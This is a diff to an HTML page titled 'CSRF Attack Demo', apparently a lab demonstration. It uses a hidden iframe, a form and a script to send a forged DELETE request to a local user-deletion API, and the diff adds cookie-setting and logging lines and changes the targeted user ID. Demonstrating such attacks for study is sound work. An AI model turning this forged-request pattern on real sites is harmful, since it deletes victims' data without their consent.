@@ -6,7 +6,8 @@
 <body>
     <h1>CSRF Attack Demo</h1>
     <h1>
-        {{ .title }}
+        <!-- {{ .title }} -->
+        Hi,訪客~~~~~~~
     </h1>
     <iframe style="display:none" name="csrf-frame"></iframe>
     <form method='DELETE' action='http://localhost:8080/user/api/delete' target="csrf-frame" id="csrfForm">
@@ -19,9 +20,14 @@
     <script>
         document.getElementById("csrfForm").addEventListener("submit", function(event) {
             event.preventDefault(); // 阻止表单的默认提交行为
+            // 設置 Cookie
+            document.cookie = "jwt-token=pass; expires=Sat, 31 Dec 2023 23:59:59 UTC; path=/";
+            // 讀取 Cookie
+            var cookieValue = document.cookie;
+            console.log("cookieValue:",cookieValue);
             // 构建DELETE请求
             var xhr = new XMLHttpRequest();
-            xhr.open("DELETE", "http://localhost:8080/user/api/delete/52");
+            xhr.open("DELETE", "http://localhost:8080/user/api/delete/70");
             xhr.setRequestHeader("Content-Type", "application/json"); // 设置请求头
             // 发送请求
             xhr.send();
